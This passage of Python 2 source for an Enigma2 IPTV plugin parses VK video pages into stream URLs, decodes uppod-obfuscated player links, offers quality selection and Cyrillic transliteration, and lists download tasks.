                    video_no_flv = video_no_flv_list[0].strip(' \t\n\r')
                video_max_hd_list = re.findall("var video_max_hd = '(.*)'", html)
                if len(video_max_hd_list) > 0:
                    video_max_hd = int(video_max_hd_list[0].strip(' \t\n\r'))
                vkid_list = re.findall('vkid=(.*)&amp;md_title', html)
                if len(vkid_list) > 0:
                    vkid = vkid_list[0].strip(' \t\n\r')
                if video_no_flv == '1' or url.find('hd=1') > -1:
                    self.vod_url = video_host + 'u' + video_uid + '/videos/' + video_vtag
                    if video_max_hd == 0:
                        self.film_quality = None
                        self.vod_url = self.vod_url + '.240.mp4'
                    if video_max_hd == 1:
                        self.film_quality = ('240', '360')
                    if video_max_hd == 2:
                        self.film_quality = ('240', '360', '480')
                    if video_max_hd == 3:
                        self.film_quality = ('240', '360', '480', '720')
                    if video_max_hd == 4:
                        self.film_quality = ('240', '360', '480', '720', '1080')
                elif video_no_flv == '0':
                    helper = 'http://'
                    slash = '/'
                    if url.find('http') > -1:
                        helper = ''
                        slash = ''
                    self.vod_url = helper + video_host + slash + 'assets/videos/' + video_vtag + vkid + '.vk.flv'
                    self.film_quality = None
                else:
                    finder = html.find('<body>')
                    html = html[finder:]
                    text = re.compile('<[\\/\\!]*?[^<>]*?>')
                    text_clear = ''
                    text_clear = text.sub('', html)
                    self.session.open(MessageBox, text_clear.encode('utf-8'), type=MessageBox.TYPE_ERROR)
        except Exception as ex:
            print 'ERROR+++++++++++++++++parse_url++++++++++++++++++++++ERROR'
            print ex

        if self.vod_url.find('youtube') > -1:
            youtube = YOUTUBE.get_youtube_link2(self.vod_url)
            if youtube[0]:
                self.error_message = youtube[0]
                self.vod_url = 'none'
            else:
                self.vod_url = youtube[1]
                self.title = self.title + ' [YT:' + YOUTUBE.quality + ']'
        if self.vod_url.find('VIZOR') > -1:
            url = self.uppod_decode(self.vod_url[5:], 'vizor')
            url = url[:-1]
            self.vod_url = url
        debug(self.vod_url, '#### self.vod_url ####')
        return self.vod_url

    def uppod_decode(self, param, server):
        loc_3 = [0,
         0,
         0,
         0]
        loc_4 = [0, 0, 0]
        loc_2 = ''
        dec = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        if server == 'vizor':
            hash1 = ['V',
             'H',
             '7',
             'I',
             'T',
             'l',
             'a',
             'x',
             'b',
             'W',
             'd',
             'X',
             'i',
             '6',
             'f',
             'B',
             'L',
             'w',
             '5',
             '8',
             '0',
             'k',
             'n',
             '9',
             '2',
             '=']
            hash2 = ['p',
             'Y',
             'c',
             'z',
             '4',
             'v',
             'o',
             'G',
             's',
             'Z',
             'e',
             'D',
             '3',
             'N',
             '1',
             'm',
             'g',
             't',
             'Q',
             'u',
             'M',
             'R',
             'J',
             'y',
             'U',
             'r']
        else:
            hash1 = ['L',
             'y',
             'c',
             'X',
             '2',
             'M',
             'a',
             'l',
             'p',
             '5',
             'Q',
             'e',
             'R',
             't',
             'Z',
             'Y',
             '9',
             'm',
             'd',
             '0',
             's',
             'V',
             'b',
             '3',
             '7',
             '=']
            hash2 = ['i',
             'B',
             'v',
             'U',
             'H',
             '4',
             'D',
             'n',
             'k',
             '8',
             'x',
             'T',
             'u',
             'G',
             'w',
             'f',
             'N',
             'J',
             '6',
             'W',
             '1',
             'g',
             'z',
             'o',
             'I',
             'r']
        for i in range(0, len(hash1)):
            re1 = hash1[i]
            re2 = hash2[i]
            param = param.replace(re1, '___')
            param = param.replace(re2, re1)
            param = param.replace('___', re2)

        i = 0
        while i < len(param):
            j = 0
            while j < 4 and i + j < len(param):
                loc_3[j] = dec.find(param[i + j])
                j = j + 1

            loc_4[0] = (loc_3[0] << 2) + ((loc_3[1] & 48) >> 4)
            loc_4[1] = ((loc_3[1] & 15) << 4) + ((loc_3[2] & 60) >> 2)
            loc_4[2] = ((loc_3[2] & 3) << 6) + loc_3[3]
            j = 0
            while j < 3:
                if loc_3[j + 1] == 64:
                    break
                loc_2 += unichr(loc_4[j])
                j = j + 1

            i = i + 4

        return loc_2.encode('utf-8')

    def power_off(self):
        self.close(1)

    def exit(self):
        if STREAMS.playhack == '':
            self.close()


class SelectQuality(Screen):

    def __init__(self, session, film_quality = None):
        Screen.__init__(self, session)
        self.film_quality = []
        self['actions'] = HelpableActionMap(self, 'nStreamPlayerVOD', {'back': self.exit,
         'ok': self.ok}, -1)
        for x in range(len(film_quality)):
            self.film_quality.append('%i. %sp' % (x + 1, film_quality[x]))

        self['filmparts'] = MenuList(self.film_quality)
        self['menulabel'] = Label('Seleccione Calidad')

    def ok(self):
        self.close(self['filmparts'].l.getCurrentSelectionIndex())

    def exit(self):
        self.close(None)
        return


def Plugins(**kwargs):
    return [PluginDescriptor(name='videomanualesSF', description='Home.Media.Stream', where=PluginDescriptor.WHERE_MENU, fnc=menu), PluginDescriptor(name='videomanualesSF', description='Home.Media.Stream', where=PluginDescriptor.WHERE_PLUGINMENU, fnc=Start_iptv_palyer, icon='plugin.png')]


conversion = {unicode('\xd0\xb0'): 'a',
 unicode('\xd0\x90'): 'A',
 unicode('\xd0\xb1'): 'b',
 unicode('\xd0\x91'): 'B',
 unicode('\xd0\xb2'): 'v',
 unicode('\xd0\x92'): 'V',
 unicode('\xd0\xb3'): 'g',
 unicode('\xd0\x93'): 'G',
 unicode('\xd0\xb4'): 'd',
 unicode('\xd0\x94'): 'D',
 unicode('\xd0\xb5'): 'e',
 unicode('\xd0\x95'): 'E',
 unicode('\xd1\x91'): 'jo',
 unicode('\xd0\x81'): 'jo',
 unicode('\xd0\xb6'): 'zh',
 unicode('\xd0\x96'): 'ZH',
 unicode('\xd0\xb7'): 'z',
 unicode('\xd0\x97'): 'Z',
 unicode('\xd0\xb8'): 'i',
 unicode('\xd0\x98'): 'I',
 unicode('\xd0\xb9'): 'j',
 unicode('\xd0\x99'): 'J',
 unicode('\xd0\xba'): 'k',
 unicode('\xd0\x9a'): 'K',
 unicode('\xd0\xbb'): 'l',
 unicode('\xd0\x9b'): 'L',
 unicode('\xd0\xbc'): 'm',
 unicode('\xd0\x9c'): 'M',
 unicode('\xd0\xbd'): 'n',
 unicode('\xd0\x9d'): 'N',
 unicode('\xd0\xbe'): 'o',
 unicode('\xd0\x9e'): 'O',
 unicode('\xd0\xbf'): 'p',
 unicode('\xd0\x9f'): 'P',
 unicode('\xd1\x80'): 'r',
 unicode('\xd0\xa0'): 'R',
 unicode('\xd1\x81'): 's',
 unicode('\xd0\xa1'): 'S',
 unicode('\xd1\x82'): 't',
 unicode('\xd0\xa2'): 'T',
 unicode('\xd1\x83'): 'u',
 unicode('\xd0\xa3'): 'U',
 unicode('\xd1\x84'): 'f',
 unicode('\xd0\xa4'): 'F',
 unicode('\xd1\x85'): 'h',
 unicode('\xd0\xa5'): 'H',
 unicode('\xd1\x86'): 'c',
 unicode('\xd0\xa6'): 'C',
 unicode('\xd1\x87'): 'ch',
 unicode('\xd0\xa7'): 'CH',
 unicode('\xd1\x88'): 'sh',
 unicode('\xd0\xa8'): 'SH',
 unicode('\xd1\x89'): 'sh',
 unicode('\xd0\xa9'): 'SH',
 unicode('\xd1\x8a'): '',
 unicode('\xd0\xaa'): '',
 unicode('\xd1\x8b'): 'y',
 unicode('\xd0\xab'): 'Y',
 unicode('\xd1\x8c'): 'j',
 unicode('\xd0\xac'): 'J',
 unicode('\xd1\x8d'): 'je',
 unicode('\xd0\xad'): 'JE',
 unicode('\xd1\x8e'): 'ju',
 unicode('\xd0\xae'): 'JU',
 unicode('\xd1\x8f'): 'ja',
 unicode('\xd0\xaf'): 'JA'}

def cyr2lat(text):
    i = 0
    text = text.strip(' \t\n\r')
    text = unicode(text)
    retval = ''
    bukva_translit = ''
    bukva_original = ''
    while i < len(text):
        bukva_original = text[i]
        try:
            bukva_translit = conversion[bukva_original]
        except:
            bukva_translit = bukva_original

        i = i + 1
        retval += bukva_translit

    return retval


class nStreamTasksScreen(Screen):

    def __init__(self, session):
        Screen.__init__(self, session)
        self.session = session
        self['shortcuts'] = ActionMap(['OkCancelActions'], {'ok': self.keyOK,
         'cancel': self.keyClose}, -1)
        self['movielist'] = List([])
        self.Timer = eTimer()
        self.Timer.callback.append(self.TimerFire)
        self.onLayoutFinish.append(self.layoutFinished)
        self.onClose.append(self.__onClose)

    def __onClose(self):
        del self.Timer

    def layoutFinished(self):
        self.Timer.startLongTimer(2)

    def TimerFire(self):
        self.Timer.stop()
        self.rebuildMovieList()

    def rebuildMovieList(self):
        self.movielist = []
        self.getTaskList()
        self.getMovieList()
        self['movielist'].setList(self.movielist)
        self['movielist'].updateList(self.movielist)

    def getTaskList(self):
        for job in JobManager.getPendingJobs():
            self.movielist.append((job,
             job.name,
             job.getStatustext(),
             int(100 * job.progress / float(job.end)),
             str(100 * job.progress / float(job.end)) + '%'))

        if len(self.movielist) >= 1:
            self.Timer.startLongTimer(10)

    def getMovieList(self):
        filelist = os_listdir(STREAMS.moviefolder)
        if filelist is not None:
            filelist.sort()
            for filename in filelist:
                if os_path.isfile(STREAMS.moviefolder + '/' + filename) and filename.endswith('.meta') is False:
                    self.movielist.append(('movie',
                     filename,
                     _('Finished'),
                     100,
                     '100%'))

        return

    def keyOK(self):
        current = self['movielist'].getCurrent()
        if current:
            if current[0] == 'movie':
                sref = eServiceReference(4097, 0, STREAMS.moviefolder + '/' + current[1])
                sref.setName(current[1])
                self.session.open(nVODplayer, sref)
            else:
                job = current[0]
                self.session.openWithCallback(self.JobViewCB, JobView, job)

    def JobViewCB(self, why):
        pass

    def keyClose(self):
        self.close()
        
      
